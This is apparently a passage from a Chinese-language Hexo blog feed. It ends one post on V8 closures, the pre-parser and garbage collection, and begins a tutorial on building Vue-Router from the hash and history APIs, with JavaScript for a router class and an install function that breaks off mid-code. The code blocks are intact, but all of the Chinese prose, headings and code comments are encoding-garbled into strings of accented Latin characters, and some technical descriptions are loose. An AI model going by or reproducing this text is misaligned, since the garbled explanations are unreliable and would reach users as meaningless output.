ä½†æ˜¯ä¾ç„¶å­˜æ´»çš„ inner å‡½æ•°å¼•ç”¨äº† foo å‡½æ•°ä½œç”¨åŸŸä¸­çš„å˜é‡ d</span></span><br><span class="line">  <span class="keyword">const</span> d = <span class="number">200</span></span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> <span class="title">inner</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a + b + d</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> f = foo()</span><br></pre></td></tr></table></figure><p><em>ä¸ºäº†å®ç°è¿™ä¸€æ•ˆæœï¼š</em><br>æ­¤æ—¶V8å°±è¦å¯¹æ­¤åšç‰¹æ®Šå¤„ç†ï¼Œè´Ÿè´£å¤„ç†è¿™ä¸ªä»»åŠ¡çš„æ¨¡å—å«åš<strong>é¢„è§£æå™¨</strong></p><p>V8 å¼•å…¥é¢„è§£æå™¨ï¼Œæ¯”å¦‚å½“è§£æé¡¶å±‚ä»£ç çš„æ—¶å€™ï¼Œé‡åˆ°äº†ä¸€ä¸ªå‡½æ•°ï¼Œé‚£ä¹ˆé¢„è§£æå™¨å¹¶ä¸ä¼šç›´æ¥è·³è¿‡è¯¥å‡½æ•°ï¼Œè€Œæ˜¯å¯¹è¯¥å‡½æ•°åšä¸€æ¬¡å¿«é€Ÿçš„é¢„è§£æï¼Œå…¶ä¸»è¦ç›®çš„æœ‰ä¸¤ä¸ª</p><ul><li>åˆ¤æ–­æ˜¯å¦å­˜åœ¨è¯­æ³•é”™è¯¯</li><li>æ£€æŸ¥å‡½æ•°å†…éƒ¨æ˜¯å¦å¼•ç”¨äº†å¤–éƒ¨å˜é‡ï¼Œå¦‚æœå¼•ç”¨äº†ï¼Œå°±å°†è¯¥å˜é‡ä»æ ˆä¸­èµ‹å€¼åˆ°å †ä¸­ã€‚ä¸‹æ¬¡æ‰§è¡Œè¯¥å‡½æ•°æ—¶ï¼Œç›´æ¥ä½¿ç”¨å †ä¸­çš„å¼•ç”¨ï¼Œè¿™æ ·ï¼Œè¿™ä¸ªå¤–éƒ¨å˜é‡ï¼ˆé—­åŒ…ï¼‰å°±è¢«ä¿ç•™åœ¨å‡½æ•°çš„å †ä¸­ã€‚</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// Q: å˜é‡aä¼šè¢«åˆ†é…åˆ°æ ˆä¸Šï¼Ÿè¿˜æ˜¯å †ä¸Šï¼Ÿ</span></span><br><span class="line">  <span class="comment">// A: å †ä¸Šã€‚é¢„è§£æå™¨é˜¶æ®µåœ¨å †ä¸­å¤åˆ¶äº†ä¸€ä¸ªä¸€æ ·çš„aï¼Œè°ƒç”¨fooå‡½æ•°ä½¿fooå‡ºæ ˆæ ˆä¸­çš„aè¢«é”€æ¯ï¼Œåªå‰©ä¸‹å †ä¸­çš„a</span></span><br><span class="line">  <span class="keyword">var</span> a = <span class="number">0</span></span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> <span class="title">inner</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a++</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> t1 = foo()</span><br><span class="line"><span class="keyword">const</span> t2 = foo()</span><br><span class="line">t1() <span class="comment">// 0 </span></span><br><span class="line">t1() <span class="comment">// 1</span></span><br><span class="line">t2() <span class="comment">// 0</span></span><br></pre></td></tr></table></figure><p>å½“å‡½æ•°æ‰§è¡Œå®Œåï¼Œå‡½æ•°çš„æ‰§è¡Œä¸Šä¸‹æ–‡è¢«é”€æ¯ï¼ŒV8åˆæ˜¯å¦‚ä½•ä¿è¯é—­åŒ…ä¸è¢«é”€æ¯ï¼Ÿè¿™é‡Œå°±æ¶‰åŠåˆ°<em>åƒåœ¾å›æ”¶æœºåˆ¶</em>ã€‚</p><p><br></p><h3 id="4-åƒåœ¾å›æ”¶"><a href="#4-åƒåœ¾å›æ”¶" class="headerlink" title="4. åƒåœ¾å›æ”¶"></a>4. åƒåœ¾å›æ”¶</h3><p>åƒåœ¾å›æ”¶çš„æµç¨‹å¤§è‡´å¦‚ä¸‹ï¼š</p><ol><li>V8ä»GC Rootså¯¹è±¡å‡ºå‘ï¼Œéå†æ‰€æœ‰GC Rootä¸­çš„æ‰€æœ‰å¯¹è±¡ï¼Œéå†åˆ°çš„å¯¹è±¡ï¼Œæ˜¯å¯è®¿é—®çš„ï¼Œåä¹‹åˆ™æ˜¯ä¸å¯è®¿é—®çš„ã€‚åœ¨æµè§ˆå™¨ç¯å¢ƒä¸­ï¼ŒGC Rootæœ‰å¾ˆå¤šï¼ŒåŒ…å«ä¸‹é¢å‡ ç§:<ul><li>å…¨å±€çš„windowå¯¹è±¡ï¼ˆä½äºæ¯ä¸ªiframeä¸­ï¼‰</li><li>æ–‡æ¡£DOMï¼ˆåŸç”ŸDOMèŠ‚ç‚¹ï¼‰</li><li>å­˜æ”¾åœ¨æ ˆä¸Šçš„å˜é‡</li></ul></li><li>å›æ”¶éæ´»åŠ¨å¯¹è±¡æ‰€å æ®çš„å†…å­˜</li><li>å†…å­˜æ•´ç†</li></ol><p><em>é’ˆå¯¹é•¿æœŸå­˜åœ¨ï¼Œå­˜æ´»æ—¶é—´å¾ˆçŸ­çš„ä¸¤ç±»å¯¹è±¡ï¼ŒV8 é‡‡ç”¨äº†ä¸¤ä¸ªåƒåœ¾å›æ”¶å™¨æ¥å›æ”¶ï¼šä¸»åƒåœ¾å›æ”¶å™¨ å’Œ å‰¯åƒåœ¾å›æ”¶å™¨ã€‚</em></p><p><br></p><h4 id="4-1-ä¸»åƒåœ¾å›æ”¶å™¨-æ ‡è®°-æ¸…ç†"><a href="#4-1-ä¸»åƒåœ¾å›æ”¶å™¨-æ ‡è®°-æ¸…ç†" class="headerlink" title="4.1 ä¸»åƒåœ¾å›æ”¶å™¨: æ ‡è®° + æ¸…ç†"></a>4.1 ä¸»åƒåœ¾å›æ”¶å™¨: æ ‡è®° + æ¸…ç†</h4><p>ç”¨æ¥å›æ”¶ä¸æ­»çš„ã€æ´»å¾—æ›´ä¹…çš„å¯¹è±¡ï¼Œå¦‚å…¨å±€çš„windowã€DOMã€Web APIç­‰å¯¹è±¡ã€‚å›æ”¶æ­¥éª¤å¦‚ä¸‹ï¼š</p><p>ç”±äºè€ç”Ÿä»£çš„å¯¹è±¡æ¯”è¾ƒå¤§ï¼Œè‹¥è¦åœ¨è€ç”Ÿä»£ä¸­ä½¿ç”¨ Scavenge ç®—æ³•è¿›è¡Œåƒåœ¾å›æ”¶ï¼Œå¤åˆ¶è¿™äº›å¤§çš„å¯¹è±¡å°†ä¼šèŠ±è´¹æ¯”è¾ƒå¤šçš„æ—¶é—´ï¼Œä»è€Œå¯¼è‡´å›æ”¶æ‰§è¡Œæ•ˆç‡ä¸é«˜ï¼ŒåŒæ—¶è¿˜ä¼šæµªè´¹ä¸€åŠçš„ç©ºé—´ã€‚æ‰€ä»¥ï¼Œä¸»åƒåœ¾å›æ”¶å™¨æ˜¯é‡‡ç”¨æ ‡è®° - æ¸…é™¤ï¼ˆMark-Sweepï¼‰çš„ç®—æ³•è¿›è¡Œåƒåœ¾å›æ”¶çš„ã€‚</p><p>é¦–å…ˆæ˜¯æ ‡è®°è¿‡ç¨‹é˜¶æ®µã€‚æ ‡è®°é˜¶æ®µå°±æ˜¯ä»ä¸€ç»„æ ¹å…ƒç´ å¼€å§‹ï¼Œé€’å½’éå†è¿™ç»„æ ¹å…ƒç´ ï¼Œåœ¨è¿™ä¸ªéå†è¿‡ç¨‹ä¸­ï¼Œèƒ½åˆ°è¾¾çš„å…ƒç´ ç§°ä¸ºæ´»åŠ¨å¯¹è±¡ï¼Œæ²¡æœ‰åˆ°è¾¾çš„å…ƒç´ å°±å¯ä»¥åˆ¤æ–­ä¸ºåƒåœ¾æ•°æ®ã€‚</p><p>æ¥ä¸‹æ¥å°±æ˜¯åƒåœ¾çš„æ¸…é™¤è¿‡ç¨‹ã€‚å®ƒå’Œå‰¯åƒåœ¾å›æ”¶å™¨çš„åƒåœ¾æ¸…é™¤è¿‡ç¨‹å®Œå…¨ä¸åŒï¼Œä¸»åƒåœ¾å›æ”¶å™¨ä¼šç›´æ¥å°†æ ‡è®°ä¸ºåƒåœ¾çš„æ•°æ®æ¸…ç†æ‰ã€‚<br><br></p><h4 id="4-2-å‰¯åƒåœ¾å›æ”¶å™¨ï¼šè®¡æ•°-æ¸…ç†"><a href="#4-2-å‰¯åƒåœ¾å›æ”¶å™¨ï¼šè®¡æ•°-æ¸…ç†" class="headerlink" title="4.2 å‰¯åƒåœ¾å›æ”¶å™¨ï¼šè®¡æ•° + æ¸…ç†"></a>4.2 å‰¯åƒåœ¾å›æ”¶å™¨ï¼šè®¡æ•° + æ¸…ç†</h4><p>ç”¨æ¥å›æ”¶â€œæœç”Ÿå¤•æ­»â€çš„å¯¹è±¡ã€‚å¤§éƒ¨åˆ†å¯¹è±¡åœ¨å†…å­˜ä¸­å­˜æ´»çš„æ—¶é—´å¾ˆçŸ­ï¼Œæ¯”å¦‚å‡½æ•°å†…éƒ¨å£°æ˜çš„å˜é‡ï¼Œæˆ–è€…å—çº§ä½œç”¨åŸŸä¸­çš„å˜é‡ï¼Œå½“å‡½æ•°æˆ–è€…ä»£ç å—æ‰§è¡Œç»“æŸæ—¶ï¼Œä½œç”¨åŸŸä¸­å®šä¹‰çš„å˜é‡å°±ä¼šè¢«é”€æ¯ã€‚å› æ­¤è¿™ä¸€ç±»å¯¹è±¡ä¸€ç»åˆ†é…å†…å­˜ï¼Œå¾ˆå¿«å°±å˜å¾—ä¸å¯è®¿é—®ã€‚</p><p>V8æŠŠæ–°ç”Ÿä»£ç©ºé—´å¯¹åŠåˆ’åˆ†ä¸ºä¸¤ä¸ªåŒºåŸŸï¼Œä¸€åŠæ˜¯å¯¹è±¡åŒºåŸŸï¼Œä¸€åŠæ˜¯ç©ºé—²åŒºåŸŸï¼Œæ–°åŠ å…¥çš„å¯¹è±¡éƒ½ä¼šå­˜æ”¾åˆ°å¯¹è±¡åŒºåŸŸï¼Œå½“å¯¹è±¡åŒºåŸŸå¿«è¢«å†™æ»¡æ—¶ï¼Œå°±éœ€è¦æ‰§è¡Œä¸€æ¬¡åƒåœ¾æ¸…ç†æ“ä½œã€‚<em>ï¼ˆå†…å­˜åˆ†é…å¿«æ»¡æ—¶ï¼Œå°†å­˜æ´»çš„å¯¹è±¡ä»å¯¹è±¡åŒºåŸŸæ‹·è´åˆ°ç©ºé—²åŒºåŸŸï¼‰</em></p><p>åœ¨åƒåœ¾å›æ”¶è¿‡ç¨‹ä¸­ï¼Œé¦–å…ˆè¦å¯¹å¯¹è±¡åŒºåŸŸä¸­çš„åƒåœ¾åšæ ‡è®°ï¼›æ ‡è®°å®Œæˆä¹‹åï¼Œå°±è¿›å…¥åƒåœ¾æ¸…ç†é˜¶æ®µã€‚å‰¯åƒåœ¾å›æ”¶å™¨ä¼šæŠŠè¿™äº›å­˜æ´»çš„å¯¹è±¡å¤åˆ¶åˆ°ç©ºé—²åŒºåŸŸä¸­ï¼ŒåŒæ—¶å®ƒè¿˜ä¼šæŠŠè¿™äº›å¯¹è±¡æœ‰åºåœ°æ’åˆ—èµ·æ¥ï¼Œæ‰€ä»¥è¿™ä¸ªå¤åˆ¶è¿‡ç¨‹ï¼Œä¹Ÿå°±ç›¸å½“äºå®Œæˆäº†å†…å­˜æ•´ç†æ“ä½œï¼Œå¤åˆ¶åç©ºé—²åŒºåŸŸå°±æ²¡æœ‰å†…å­˜ç¢ç‰‡äº†ã€‚</p><p><br></p><h3 id="5-ç»“è®º"><a href="#5-ç»“è®º" class="headerlink" title="5. ç»“è®º"></a>5. ç»“è®º</h3><p>æœ‰äº†ä¸Šé¢ä¸€ç³»åˆ—çš„æ“ä½œåï¼Œå½“ V8 è§£æä¸€ä¸ªå‡½æ•°çš„æ—¶å€™ï¼Œåˆ¤æ–­è¯¥å‡½æ•°çš„å†…éƒ¨å‡½æ•°æ˜¯å¦å¼•ç”¨äº†å½“å‰å‡½æ•°å†…éƒ¨å£°æ˜çš„å˜é‡ï¼Œå¦‚æœå¼•ç”¨äº†ï¼Œé‚£ä¼šå°†è¯¥å˜é‡å­˜æ”¾åˆ°å †ä¸­ï¼Œå³ä¾¿å½“å‰å‡½æ•°æ‰§è¡Œç»“æŸä¹‹åï¼Œè¯¥å˜é‡ä¹Ÿä¸ä¼šè¢«é‡Šæ”¾ã€‚</p>]]></content>
      
      <categories>
          
          <category> JS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>å®ç°ä¸€ä¸ª Vue-Router</title>
      <link href="/2019/10/25/vue-router/"/>
      <url>/2019/10/25/vue-router/</url>
      <content type="html"><![CDATA[<h3 id="1-å®ç°åŸç†"><a href="#1-å®ç°åŸç†" class="headerlink" title="1. å®ç°åŸç†"></a>1. å®ç°åŸç†</h3><p>hash å’Œ historyéƒ½æ˜¯å®ç°å‰ç«¯è·¯ç”±çš„æµè§ˆå™¨å†å²è®°å½•APIã€‚ç›¸å¯¹è€Œè¨€ history æ¯” hash æ›´ä¸ºå¼ºå¤§ã€‚</p><h4 id="1-1-Hash"><a href="#1-1-Hash" class="headerlink" title="1.1 Hash"></a>1.1 Hash</h4><table><thead><tr><th>å±æ€§ &amp; æ–¹æ³•</th><th style="text-align:center">ä½œç”¨</th></tr></thead><tbody><tr><td><code>window.location.hash = &#39;&#39;</code></td><td style="text-align:center">å‘å†å²è®°å½•ä¸­å‹å…¥ä¸€ä¸ªæ–°è®°å½•ï¼Œ<code>window.location.hash</code>å€¼å‘ç”Ÿå˜åŒ–åï¼Œä¼šåœ¨æµè§ˆå™¨æ·»åŠ ä¸€æ¡æ–°è®°å½•</td></tr><tr><td><code>window.location.replace()</code></td><td style="text-align:center">ç”¨ç»™å®šçš„URLæ›¿æ¢è°ƒå½“å‰çš„èµ„æºï¼Œè¢«æ›¿æ¢çš„é¡µé¢ä¸ä¼šè¢«ä¿å­˜åœ¨ä¼šè¯çš„å†å²ä¸­ã€‚</td></tr><tr><td><code>window.hashchangeäº‹ä»¶</code></td><td style="text-align:center">åœ¨æµè§ˆå™¨URLä¸­hashå‘ç”Ÿå˜åŒ–åè§¦å‘ã€‚URLä¸­<em><code>#</code></em>åçš„å†…å®¹å°±æ˜¯hashï¼Œhashå˜åŒ–ä¸ä¼šå‘æœåŠ¡å™¨å‘èµ·è¯·æ±‚ã€‚</td></tr></tbody></table><p><br></p><h4 id="2-2-History"><a href="#2-2-History" class="headerlink" title="2.2 History"></a>2.2 History</h4><p>History APIå…è®¸æ“ä½œæ›¾ç»åœ¨æµè§ˆå™¨æ ‡ç­¾é¡µè®¿é—®çš„ä¼šè¯å†å²è®°å½•ã€‚</p><table><thead><tr><th>å±æ€§ &amp; æ–¹æ³•</th><th style="text-align:center">ä½œç”¨</th></tr></thead><tbody><tr><td><code>history.length</code></td><td style="text-align:center">å½“å‰å†å²è®°å½•æ ˆçš„ä¸ªæ•°</td></tr><tr><td><code>history.back()</code></td><td style="text-align:center">å‰å¾€ä¸Šä¸€é¡µï¼Œç‚¹å‡»æµè§ˆå™¨è¿”å›æŒ‰é’®å¯æ¨¡æ‹Ÿæ­¤æ–¹æ³•ï¼Œç­‰ä»·äº<code>history.go(-1)</code></td></tr><tr><td><code>history.forward()</code></td><td style="text-align:center">å‰å¾€ä¸‹ä¸€é¡µï¼Œç‚¹å‡»æµè§ˆå™¨å‰è¿›æŒ‰é’®å¯æ¨¡æ‹Ÿæ­¤æ–¹æ³•ï¼Œç­‰ä»·äº<code>history.go(1)</code></td></tr><tr><td><code>history.go()</code></td><td style="text-align:center">é€šè¿‡å½“å‰é¡µé¢çš„ç›¸å¯¹ä½ç½®ï¼Œè·³è½¬åˆ°æŸä¸ªå†å²è®°å½•é¡µé¢</td></tr><tr><td><code>history.pushState(stateObject, title, url)</code></td><td style="text-align:center">å‘æµè§ˆå™¨çš„å†å²å †æ ˆå‹å…¥ä¸€ä¸ªæ–°è®°å½•ï¼Œå¹¶æ”¹å˜å†å²å †æ ˆçš„å½“å‰æŒ‡é’ˆè‡³æ ˆé¡¶ã€‚stateObject: ç”¨äºå­˜å‚¨è¯¥urlå¯¹åº”çš„çŠ¶æ€å¯¹è±¡ï¼Œè¯¥å¯¹è±¡å¯åœ¨<code>onpopstate</code>äº‹ä»¶ä¸­è·å–ï¼Œä¹Ÿå¯åœ¨historyå¯¹è±¡ä¸­è·å–;title: æ ‡é¢˜ï¼Œç›®å‰æµè§ˆå™¨æœªå®ç°; url: ä¸€èˆ¬è®¾ç½®ä¸ºç›¸å¯¹è·¯å¾„ï¼Œå¦‚æœè®¾ç½®ä¸ºç»å¯¹è·¯å¾„æ—¶éœ€è¦ä¿è¯åŒæºã€‚</td></tr><tr><td><code>history.replaceState()</code></td><td style="text-align:center">è¿™ä¸ªæ¥å£å’Œ<code>pushState</code>å‚æ•°ç›¸åŒï¼ŒåŒºåˆ«åœ¨äº<code>replaceState</code>æ˜¯æ›¿æ¢æµè§ˆå™¨å†å²å †æ ˆçš„å½“å‰å†å²è®°å½•ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ<code>replaceState</code>ä¸ä¼šæ”¹åŠ¨æµè§ˆå™¨å†å²å †æ ˆçš„å½“å‰æŒ‡é’ˆã€‚</td></tr><tr><td><code>window.onpopstateäº‹ä»¶</code></td><td style="text-align:center">å†å²å †æ ˆçš„å½“å‰æŒ‡é’ˆæ”¹å˜ï¼Œåˆ™ä¼šè§¦å‘onpopstateäº‹ä»¶</td></tr></tbody></table><p>ç‚¹å‡»æµè§ˆå™¨çš„å‰è¿›ã€åé€€æŒ‰é’®ï¼Œæ‰§è¡Œ<em><code>history.forward</code></em>, <em><code>history.back</code></em>å’Œ<em><code>history.go</code></em>éƒ½ä¼šä¿®æ”¹å†å²å †æ ˆçš„å½“å‰æŒ‡é’ˆã€‚åœ¨ä¸æ”¹å˜documentçš„å‰æä¸‹ï¼Œä¸€æ—¦å½“å‰æŒ‡é’ˆæ”¹å˜åˆ™ä¼šè§¦å‘<em><code>onpopstate</code></em>äº‹ä»¶ã€‚</p><p>æµè§ˆå™¨æ²¡æœ‰æä¾›è®¿é—®é¡µé¢çš„å†å²è®°å½•æ ˆçš„æ¥å£ï¼Œä½†æ˜¯å®ƒæä¾›äº†<code>history.length</code>å±æ€§ï¼Œå®ƒè¡¨æ˜äº†å½“å‰å†å²è®°å½•æ ˆçš„ä¸ªæ•°ã€‚å®ƒå¯ä»¥å¸®æˆ‘ä»¬åˆ†æhistory APIå¯¹å†å²è®°å½•æ ˆçš„å½±å“ã€‚</p><p>ä¸‹å›¾è¯´æ˜äº†ï¼š</p><ul><li>æ‰§è¡Œ<em><code>window.history.go</code></em>, <em><code>history.back</code></em>, <em><code>history.forward</code></em>æ—¶ï¼Œhistoryæ ˆå¤§å°ä¸ä¼šæ”¹å˜ï¼Œä»…ä»…ç§»åŠ¨å½“å‰æŒ‡é’ˆçš„ä½ç½®</li><li>æ‰§è¡Œ<em><code>pushState</code></em>æ—¶ï¼Œä¼šåœ¨å½“å‰æŒ‡é’ˆä¸Šå‹å…¥ä¸€ä¸ªurlå…¥æ ˆé¡¶ï¼ŒåŒæ—¶ä¿®æ”¹å½“å‰æŒ‡é’ˆ</li></ul><p><img src="/2019/10/25/vue-router/1.png"></p><p><br></p><h3 id="2-å®ç°åŠŸèƒ½"><a href="#2-å®ç°åŠŸèƒ½" class="headerlink" title="2. å®ç°åŠŸèƒ½"></a>2. å®ç°åŠŸèƒ½</h3><p>Vue RouteråŠŸèƒ½ï¼š</p><ul><li>Routeræ„å»ºé€‰é¡¹<code>mode</code>: æ”¯æŒHTML5 History, hash, abstractæ¨¡å¼</li><li>Routeræ„å»ºé€‰é¡¹<code>routes</code>: æ”¯æŒä¼ å…¥<code>{ path: string, component: Component }</code></li><li>ä½¿ç”¨<code>&lt;router-link&gt;</code>æ¥å®šä¹‰å¯¼èˆªé“¾æ¥</li><li>ä½¿ç”¨<code>&lt;router-view&gt;</code>æ¸²æŸ“è·¯å¾„åŒ¹é…åˆ°çš„è§†å›¾ç»„ä»¶</li><li>ä½¿ç”¨<code>this.$router.push()</code>, <code>this.$router.replace</code>, <code>this.$router.go</code>å®ç°è·¯ç”±è·³è½¬</li><li>ä½¿ç”¨<code>this.$route.params</code>, <code>this.$route.query</code>è·å–è·¯å¾„å‚æ•°</li><li><p>å®ç°Routerçš„ç”Ÿå‘½å‘¨æœŸé’©å­ï¼ˆæ‰§è¡Œé¡ºåºï¼‰</p></li><li><p>åŠ¨æ€è·¯ç”±åŒ¹é…</p></li><li>åµŒå¥—è·¯ç”±</li><li>åµŒå¥—è§†å›¾</li><li>å¯¼èˆªå®ˆå«</li><li>è¿‡æ¸¡åŠ¨æ•ˆ</li><li>è·¯ç”±æ‡’åŠ è½½</li></ul><p><br></p><h3 id="3-å¼€å§‹å®ç°"><a href="#3-å¼€å§‹å®ç°" class="headerlink" title="3. å¼€å§‹å®ç°"></a>3. å¼€å§‹å®ç°</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> VueRouter(&#123;</span><br><span class="line">  mode: <span class="string">'history'</span>,</span><br><span class="line">  routes</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">  render: <span class="function"><span class="params">h</span> =&gt;</span> h(App),</span><br><span class="line">  router,</span><br><span class="line">&#125;).$mount(<span class="string">'#app'</span>)</span><br></pre></td></tr></table></figure><h4 id="3-1-åˆ›å»ºVueRouterå®ä¾‹"><a href="#3-1-åˆ›å»ºVueRouterå®ä¾‹" class="headerlink" title="3.1 åˆ›å»ºVueRouterå®ä¾‹"></a>3.1 åˆ›å»ºVueRouterå®ä¾‹</h4><p>åˆ›å»ºä¸€ä¸ªVue Routerå®ä¾‹ï¼Œæ¥æ”¶<code>mode</code>, <code>routes</code>å‚æ•°</p><ul><li>ä¸º<code>this.$router</code>æä¾›è·¯ç”±<code>push</code>, <code>replace</code>, <code>go</code>, <code>back</code>, <code>forward</code>æ–¹æ³•</li><li>å°†ä¼ å…¥çš„routesè½¬æˆrouterMap <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// src/index.js</span></span><br><span class="line"><span class="keyword">import</span> HashHistory <span class="keyword">from</span> <span class="string">'../history/hash'</span></span><br><span class="line"><span class="keyword">import</span> HTML5History <span class="keyword">from</span> <span class="string">'../history/html5'</span></span><br><span class="line"><span class="keyword">import</span> AbstractHistory <span class="keyword">from</span> <span class="string">'../history/abstract'</span></span><br><span class="line"><span class="keyword">import</span> &#123; createMatcher &#125; <span class="keyword">from</span> <span class="string">'./create-matcher'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">VueRouter</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(options) &#123;</span><br><span class="line">    <span class="keyword">this</span>.app = <span class="literal">null</span></span><br><span class="line">    <span class="keyword">this</span>.apps = []</span><br><span class="line">    <span class="keyword">this</span>.options = options</span><br><span class="line">    <span class="keyword">this</span>.mode = options.mode || <span class="string">'hash'</span></span><br><span class="line">    <span class="keyword">this</span>.fallback = options.mode === <span class="string">'history'</span></span><br><span class="line">    <span class="keyword">this</span>.history = <span class="literal">null</span></span><br><span class="line">    <span class="keyword">this</span>.matcher = createMatcher(options.routes || [], <span class="keyword">this</span>) <span class="comment">// è·¯ç”±åŒ¹é…å¯¹è±¡</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">switch</span>(<span class="keyword">this</span>.mode) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'history'</span>:</span><br><span class="line">        <span class="keyword">this</span>.history = <span class="keyword">new</span> HTML5History(<span class="keyword">this</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">'hash'</span>: </span><br><span class="line">        <span class="keyword">this</span>.history = <span class="keyword">new</span> HashHistory(<span class="keyword">this</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">'abstract'</span>:</span><br><span class="line">        <span class="keyword">this</span>.history = <span class="keyword">new</span> AbstractHistory(<span class="keyword">this</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`invalid mode: <span class="subst">$&#123;<span class="keyword">this</span>.mode&#125;</span>`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  push(location) &#123;</span><br><span class="line">    <span class="keyword">this</span>.history.push(location)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  replace(location) &#123;</span><br><span class="line">    <span class="keyword">this</span>.history.replace(location)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  go(n) &#123;</span><br><span class="line">    <span class="keyword">this</span>.history.go(n)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  back() &#123;</span><br><span class="line">    <span class="keyword">this</span>.go(<span class="number">-1</span>)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  forward() &#123;</span><br><span class="line">    <span class="keyword">this</span>.go(<span class="number">1</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="3-3-router-route"><a href="#3-3-router-route" class="headerlink" title="3.3 router, route"></a>3.3 router, route</h4><ul><li><code>Vue.use(Router)</code>æ—¶ï¼Œä¼šæ‰§è¡Œ<code>install</code>æ–¹æ³•å¹¶æŠŠVueç±»ä¼ å…¥ï¼Œæ··å…¥<code>beforeCreate</code>æ–¹æ³•</li><li>å°†<code>$router</code>, <code>$route</code>æ”¾åˆ°<code>Vue.prototype</code>ä¸Šï¼Œä¿è¯æ¯ä¸ªVueå®ä¾‹éƒ½å¯ä»¥è®¿é—®</li><li>å®šä¹‰å…¨å±€ç»„ä»¶<code>router-link</code>, <code>router-view</code><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// install.js</span></span><br><span class="line"><span class="keyword">import</span> View <span class="keyword">from</span> <span class="string">'../components/view'</span></span><br><span class="line"><span class="keyword">import</span> Link <span class="keyword">from</span> <span class="string">'../components/link'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span> <span class="title">install</span>(<span class="params">Vue</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> isDef = <span class="function"><span class="params">v</span> =&gt;</span> v !== <span 